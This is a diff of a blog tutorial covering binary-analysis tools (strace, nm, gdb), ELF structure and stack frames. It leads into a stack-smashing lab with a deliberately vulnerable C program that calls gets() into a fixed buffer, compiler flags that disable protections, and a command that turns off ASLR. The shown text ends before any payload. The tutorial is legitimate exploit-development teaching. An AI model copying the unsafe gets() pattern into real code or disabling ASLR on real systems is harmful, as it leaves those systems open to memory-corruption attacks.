+If you have used <code>ltrace</code>, mentioned earlier, think of <code>strace</code> being similar. The only difference is that, instead of calling a library, the <code>strace</code> utility traces system calls. System calls are how you interface with the kernel to get work done.</p>
 <p><img src="https://scaler.com/topics/images/intro_system_call.webp" alt="System Call">
-<em>Source: <a href="https://www.scaler.com/topics/operating-system/system-calls-in-operating-system/">scaler</a></em></p>
+<em>Image Source: <a href="https://www.scaler.com/topics/operating-system/system-calls-in-operating-system/">scaler</a></em></p>
 <p>By default, strace does not trace child processes. To trace them as well, use the -f option:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ strace -f file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace -f file_dyn
 </span></span></code></pre></div><p>To view the system calls along with their arguments:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ strace -f -v file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ strace -f -v file_dyn
 </span></span></code></pre></div><p><strong>9. nm</strong></p>
-<p>The nm command is a powerful utility used to display symbols from object files, executables, and libraries. It stands for &ldquo;name list&rdquo; and provides valuable information about the symbols defined in these files, including functions, variables, and other entities.</p>
+<p>The <code>nm</code> command in Linux stands for Name Mangler. It is used to list symbols from object files, such as <code>.o</code> files, static libraries (<code>.a</code> files), and shared libraries (<code>.so</code> files). The <code>nm</code> command provides information about the symbols in these files, including their names, addresses, and types, which is useful for debugging and analyzing compiled code.</p>
 <ul>
 <li>List Symbols in an Object File</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nm file_dyn
-</span></span></code></pre></div><ul>
-<li>Display Dynamic Symbols
-To display dynamic symbols (usually found in shared libraries):</li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#75715e"># Compile a C source file into an object file using the following command:</span>
+</span></span><span style="display:flex;"><span>$ gcc -c file.c
+</span></span><span style="display:flex;"><span>$ nm file.o
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0000000000000000</span> T main
+</span></span><span style="display:flex;"><span>                 U puts
+</span></span></code></pre></div><p>The first column shows the address of the symbol in hexadecimal. For the main function, this is <code>0000000000000000</code>, indicating that it is defined but not yet assigned a memory address since it is still in the object file state.</p>
+<p>Symbol Type:</p>
+<ul>
+<li>T: This indicates that main is a defined symbol (function) and is stored in the text (code) section of the object file. The capital T signifies that it is a global symbol, meaning it can be referenced from other object files or libraries.</li>
+<li>U: The puts function is marked as undefined. This means that the puts function is referenced in file.c but is not defined in the object file. Instead, it will be resolved during the linking stage, where the linker will find the implementation of puts in the standard C library.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nm -D libadd.so
-</span></span></code></pre></div><ul>
-<li>List Symbols Sorted by Name
-Apply numeric sort on the addresses:</li>
+<p>Here’s a list of the common symbol types recognized by the nm command in Linux:</p>
+<table>
+<thead>
+<tr>
+<th>Character</th>
+<th>Symbol Type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>T</code></td>
+<td><strong>Text (code)</strong></td>
+<td>The symbol is defined in the text (code) section of the object file and is globally accessible (externally visible).</td>
+</tr>
+<tr>
+<td><code>t</code></td>
+<td><strong>Text (code)</strong></td>
+<td>The symbol is defined in the text section but is local to the object file (not externally visible).</td>
+</tr>
+<tr>
+<td><code>D</code></td>
+<td><strong>Data</strong></td>
+<td>The symbol is defined in the initialized data section and is globally accessible.</td>
+</tr>
+<tr>
+<td><code>d</code></td>
+<td><strong>Data</strong></td>
+<td>The symbol is defined in the initialized data section but is local to the object file.</td>
+</tr>
+<tr>
+<td><code>B</code></td>
+<td><strong>BSS (uninitialized data)</strong></td>
+<td>The symbol is defined in the uninitialized data section and is globally accessible.</td>
+</tr>
+<tr>
+<td><code>b</code></td>
+<td><strong>BSS (uninitialized data)</strong></td>
+<td>The symbol is defined in the uninitialized data section but is local to the object file.</td>
+</tr>
+<tr>
+<td><code>R</code></td>
+<td><strong>Read-only data</strong></td>
+<td>The symbol is defined in the read-only data section and is globally accessible.</td>
+</tr>
+<tr>
+<td><code>r</code></td>
+<td><strong>Read-only data</strong></td>
+<td>The symbol is defined in the read-only data section but is local to the object file.</td>
+</tr>
+<tr>
+<td><code>U</code></td>
+<td><strong>Undefined</strong></td>
+<td>The symbol is referenced but not defined in the object file. It must be resolved during linking.</td>
+</tr>
+<tr>
+<td><code>W</code></td>
+<td><strong>Weak symbol</strong></td>
+<td>The symbol is a weak definition, which means it may be overridden by a strong definition in another object file.</td>
+</tr>
+<tr>
+<td><code>V</code></td>
+<td><strong>Weak symbol (versioned)</strong></td>
+<td>A weak symbol with versioning information.</td>
+</tr>
+<tr>
+<td><code>N</code></td>
+<td><strong>Debugging symbol</strong></td>
+<td>The symbol is a debugging symbol (like a file scope) and is not relevant for the actual executable code.</td>
+</tr>
+<tr>
+<td><code>S</code></td>
+<td><strong>Symbol from a shared library</strong></td>
+<td>The symbol comes from a shared library but is not defined in the object file itself.</td>
+</tr>
+<tr>
+<td><code>?</code></td>
+<td><strong>Unknown</strong></td>
+<td>The symbol type is unknown or cannot be determined.</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Display Dynamic Symbols (usually found in shared libraries):</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nm -n file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nm -D libadd.so
+</span></span></code></pre></div><ul>
+<li>List Symbols and Apply numeric sort on the addresses:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ nm -n file_dyn
 </span></span></code></pre></div><p><strong>10. gdb</strong></p>
 <p>GDB (GNU Debugger) is a powerful command-line debugger for Unix-like systems. It allows developers to inspect and debug programs, providing a wide range of features for analyzing and manipulating the execution of code. From setting breakpoints to examining memory to stepping through code line-by-line, GDB is an essential tool for understanding and fixing software issues.</p>
 <ul>
 <li>Start GDB with Program</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gdb file_dyn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb file_dyn
 </span></span></code></pre></div><ul>
 <li>Set Breakpoints</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break &lt;line_number&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break &lt;line_number&gt;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break <span style="color:#ae81ff">10</span>
 </span></span></code></pre></div><ul>
 <li>To run the program:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run
 </span></span></code></pre></div><ul>
 <li>Continue Execution</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> <span style="color:#66d9ef">continue</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> <span style="color:#66d9ef">continue</span>
 </span></span></code></pre></div><ul>
 <li>Print Variable Value</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> print &lt;variable&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> print &lt;variable&gt;
 </span></span></code></pre></div><p>If you&rsquo;re ready to delve deeper into the world of debugging and unlock its full potential, I invite you to check out my blog post titled &ldquo;GDB: Zero to Hero.&rdquo; In this advanced guide, you&rsquo;ll discover a comprehensive tutorial on mastering the GNU Debugger (GDB) from scratch. Learn advanced debugging techniques, explore powerful features, and elevate your debugging skills to the next level.</p>
 <p>Read <a href="../../gdb">&ldquo;GDB: Zero to Hero&rdquo;.</a></p>
-<h2 id="elf-fundamentals">ELF Fundamentals</h2>
+<p>For a deeper understanding of binary analysis, I will be writing a blog post on this topic soon.</p>
+<h3 id="elf-101">ELF 101</h3>
+<p>The Executable and Linkable Format (ELF) is a common standard file format for executable files, object code, shared libraries, and core dumps in Unix-like operating systems, including Linux. It provides a flexible and extensible structure for binary files, making it easier for the operating system to load and execute them.</p>
+<p><strong>Key Features of ELF</strong></p>
+<ul>
+<li>Portability: ELF files can be used across different hardware architectures and operating systems, facilitating cross-platform development.</li>
+<li>Modularity: ELF supports dynamic linking and loading, allowing programs to use shared libraries and load modules at runtime.</li>
+<li>Extensibility: The ELF format is designed to be extensible, enabling the addition of new sections and types without breaking compatibility.</li>
+</ul>
+<p><strong>Structure of ELF</strong></p>
+<p>An ELF file is divided into several key components:</p>
+<ol>
+<li>ELF Header: Contains metadata about the file, such as the architecture, entry point address, and the program and section header table offsets.</li>
+<li>Program Header Table: Describes the segments of the file used during program execution, providing information needed for the operating system to load the program into memory.</li>
+<li>Section Header Table: Contains information about the sections of the file, such as text (code), data, and symbol tables, which are useful during linking and debugging.</li>
+<li>Sections: Individual components within the ELF file, each serving a specific purpose, including:
+<ul>
+<li><code>.text</code>: Contains the executable code.</li>
+<li><code>.data</code>: Holds initialized global and static variables.</li>
+<li><code>.bss</code>: Contains uninitialized global and static variables.</li>
+<li><code>.rodata</code>: Contains read-only data, such as string literals.</li>
+<li><code>.symtab</code>: Symbol table for linking and debugging.</li>
+</ul>
+</li>
+</ol>
+<p>To determine the type of an ELF file, you can use the <code>readelf</code> and <code>file</code> commands in Linux.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ <span style="color:#75715e"># $ readelf -h &lt;binary&gt;</span>
+</span></span><span style="display:flex;"><span>$ readelf -h file_dyn
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  Type:                              DYN <span style="color:#f92672">(</span>Position-Independent Executable file<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>$ readelf -h file.o
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  Type:                              REL <span style="color:#f92672">(</span>Relocatable file<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Types of ELF Files</strong></p>
+<p>Executable ELF (EXEC):</p>
+<ul>
+<li>Purpose: Contains a program that is ready to be executed by the operating system.</li>
+<li>Characteristics: Has a defined entry point and is directly runnable.</li>
+</ul>
+<p>Dynamic ELF (DYN):</p>
+<ul>
+<li>Purpose: Used for shared libraries that can be linked at runtime.</li>
+<li>Characteristics: Supports dynamic linking, allowing multiple programs to share the same library in memory.</li>
+</ul>
+<p>Relocatable ELF (REL):</p>
+<ul>
+<li>Purpose: Contains object code that can be linked to create an executable or a shared library.</li>
+<li>Characteristics: The addresses of symbols are not yet fixed and need to be resolved during the linking process.</li>
+</ul>
+<p>Core ELF (CORE):</p>
+<ul>
+<li>Purpose: A core dump of a process&rsquo;s memory at the time of a crash.</li>
+<li>Characteristics: Contains the process&rsquo;s memory image, including the stack, heap, and CPU registers, useful for debugging.</li>
+</ul>
+<h3 id="how-the-stack-operates">How the Stack Operates</h3>
+<p>Before diving into <strong>Linux stack smashing</strong>, I’d like to take a moment to briefly explain the stack and its significance in program execution.</p>
+<p>The stack is a special region of memory that stores temporary variables created by functions. It operates on a Last In, First Out (LIFO) basis, meaning the last item added to the stack is the first one to be removed. Each time a function is called, a new stack frame is created, which contains:</p>
+<ul>
+<li>Local Variables: Variables that are only accessible within the function.</li>
+<li>Return Address: The address to which control should return after the function completes.</li>
+<li>Function Parameters: Values passed to the function from its caller.</li>
+</ul>
+<p>Below is a simple program that will help illustrate how the stack works in a C program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">myFunc</span>(<span style="color:#66d9ef">int</span> a, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;1st arg: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, a);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;2nd arg: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Hello</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">myFunc</span>(num, str);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;          <span style="color:#75715e">// Added return statement for main
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 stack.c -no-pie -fno-stack-protector -o stack
+</span></span></code></pre></div><p>In this program, we define a function <code>myFunc</code> that takes an integer and a string as arguments. While plain GDB provides basic debugging functionality, it lacks syntax highlighting and many advanced features that can enhance the debugging experience. We can improve GDB’s capabilities by using extensions such as <a href="https://github.com/pwndbg/pwndbg">pwndbg</a> or <a href="https://hugsy.github.io/gef/install/">GEF</a>. Personally, I find both extensions useful, but for this series, we’ll focus on using pwndbg. Of course, you’re free to use GEF if you prefer!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb ./stack
+</span></span><span style="display:flex;"><span>pwndbg&gt; disass main 
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+</span></span><span style="display:flex;"><span>   0x080491a8 &lt;+0&gt;:	lea    ecx,<span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>   0x080491dc &lt;+52&gt;:	call   0x8049166 &lt;myFunc&gt;
+</span></span><span style="display:flex;"><span>   0x080491e1 &lt;+57&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>pwndbg&gt; disass myFunc  
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> myFunc:
+</span></span><span style="display:flex;"><span>   0x08049166 &lt;+0&gt;:	push   ebp
+</span></span><span style="display:flex;"><span>   0x08049167 &lt;+1&gt;:	mov    ebp,esp
+</span></span><span style="display:flex;"><span>   0x08049169 &lt;+3&gt;:	push   ebx
+</span></span><span style="display:flex;"><span>   0x0804916a &lt;+4&gt;:	sub    esp,0x4
+</span></span><span style="display:flex;"><span>   0x0804916d &lt;+7&gt;:	call   0x80490a0 &lt;__x86.get_pc_thunk.bx&gt;
+</span></span><span style="display:flex;"><span>   0x08049172 &lt;+12&gt;:	add    ebx,0x2e82
+</span></span><span style="display:flex;"><span>   0x08049178 &lt;+18&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x0804917b &lt;+21&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ebp+0x8<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x0804917e &lt;+24&gt;:	lea    eax,<span style="color:#f92672">[</span>ebx-0x1fec<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x08049184 &lt;+30&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x08049185 &lt;+31&gt;:	call   0x8049040 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x0804918a &lt;+36&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x0804918d &lt;+39&gt;:	sub    esp,0x8
+</span></span><span style="display:flex;"><span>   0x08049190 &lt;+42&gt;:	push   DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x08049193 &lt;+45&gt;:	lea    eax,<span style="color:#f92672">[</span>ebx-0x1fdf<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x08049199 &lt;+51&gt;:	push   eax
+</span></span><span style="display:flex;"><span>   0x0804919a &lt;+52&gt;:	call   0x8049040 &lt;printf@plt&gt;
+</span></span><span style="display:flex;"><span>   0x0804919f &lt;+57&gt;:	add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080491a2 &lt;+60&gt;:	nop
+</span></span><span style="display:flex;"><span>   0x080491a3 &lt;+61&gt;:	mov    ebx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   0x080491a6 &lt;+64&gt;:	leave
+</span></span><span style="display:flex;"><span>   0x080491a7 &lt;+65&gt;:	ret
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>When <code>myFunc(num, str)</code> is called, a <strong>new stack frame</strong> is created for <code>myFunc</code>. This stack frame contains:</p>
+<ul>
+<li>The return address (where the program should continue after myFunc finishes).</li>
+<li>Local variables a and s, which hold the values passed from main (num and str).</li>
+</ul>
+<p>Let’s set a breakpoint at the beginning of <code>myFunc</code> to analyze the stack:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b *myFunc 
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> at 0x8049166
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; run
+</span></span></code></pre></div><p>After running the program, we can check the stack state:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; stack
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd59c —▸ 0x80491e1 <span style="color:#f92672">(</span>main+57<span style="color:#f92672">)</span> ◂— add esp, 0x10
+</span></span><span style="display:flex;"><span>01:0004│-028 0xffffd5a0 ◂— 0xa /* <span style="color:#e6db74">&#39;\n&#39;</span> */
+</span></span><span style="display:flex;"><span>02:0008│-024 0xffffd5a4 —▸ 0x804a022 ◂— <span style="color:#e6db74">&#39;Hello\n&#39;</span>
+</span></span></code></pre></div><p>As we can see, the return address <code>0x80491e1</code> has been pushed onto the stack.</p>
+<p>Next, let’s set a breakpoint at the <code>ret</code> instruction inside <code>myFunc</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; b *myFunc + <span style="color:#ae81ff">65</span>
+</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">2</span> at 0x80491a7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; c
+</span></span></code></pre></div><p>After hitting the second breakpoint, we can observe that the top of the stack contains the address <code>0x80491e1</code>. The <code>ret</code> instruction will pop this address off the stack and place it into the EIP register. Let’s use <code>stepi</code> to step through the instruction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; stepi 
+</span></span><span style="display:flex;"><span>pwndbg&gt; reg $eip
+</span></span><span style="display:flex;"><span> $EIP 0x80491e1 <span style="color:#f92672">(</span>main+57<span style="color:#f92672">)</span> ◂— add esp, 0x10
+</span></span></code></pre></div><p>As we can see, the EIP register now holds the return address. This demonstrates how the control flow is managed via the stack during function calls.</p>
+<h2 id="linux-stack-smashing">Linux Stack Smashing</h2>
+<p>Now that we&rsquo;ve covered binary analysis, it&rsquo;s time to delve into the concept of buffer overflow and its intricacies. 🎉💥</p>
+<p>We will use the following vulnerable program <code>vuln.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;You&#39;ve reached the win function! 🎉</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>]; 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter some text:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(buffer); <span style="color:#75715e">// Unsafe function - vulnerable to buffer overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Try Again!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>To create our vulnerable binary, we&rsquo;ll compile it with all security checks disabled:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 -z execstack -no-pie vuln.c -o vuln
+</span></span></code></pre></div><p>Before we run our newly compiled binary, let&rsquo;s disable Address Space Layout Randomization (ASLR) to make it easier to exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ echo <span style="color:#ae81ff">0</span> | sudo tee /proc/sys/kernel/randomize_va_space
+</span></span></code></pre></div><p>Now, let&rsquo;s take a moment to check the security features of our binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pwn checksec vuln
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/kali/Desktop/Blogs/Materials/x86_exp_dev/01/vuln&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       i386-32-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      No canary found
+</span></span><span style="display:flex;"><span>    NX:         NX unknown - GNU_STACK missing
+</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Stack:      Executable
+</span></span><span style="display:flex;"><span>    RWX:        Has RWX segments
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><p>The checksec utility is included with the pwntools library, a powerful set of tools for binary exploitation. If you haven&rsquo;t already installed pwntools, you can do so easily using pip. Here’s how:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ pip install pwntools
+</span></span></code></pre></div><p>Next, let’s break down what each of these security measures means.</p>
+<ul>
+<li><code>Arch</code> - i386-32-little:  Indicates that the binary is compiled for a 32-bit x86 architecture using little-endian byte order. This is important for understanding compatibility and potential exploits.</li>
+<li><code>RELRO</code>: Partial RELRO: RELRO (RELocation Read-Only) is a security feature that makes certain parts of the binary read-only after initialization. Partial RELRO means that only some sections are protected, which is less secure than Full RELRO.</li>
+<li><code>Stack: No canary found</code> - Stack canaries are used to detect buffer overflows by placing a special value (canary) before the return address. If the canary is modified, the program terminates, preventing exploitation. The absence of a canary makes the binary vulnerable to such attacks.</li>
+<li><code>NX - NX unknown - GNU_STACK missing</code> -  NX (No-eXecute) prevents execution of code in certain memory regions. NX unknown means it’s unclear if NX is enforced, and GNU_STACK missing indicates that the binary lacks the necessary flags to specify its execution characteristics.</li>
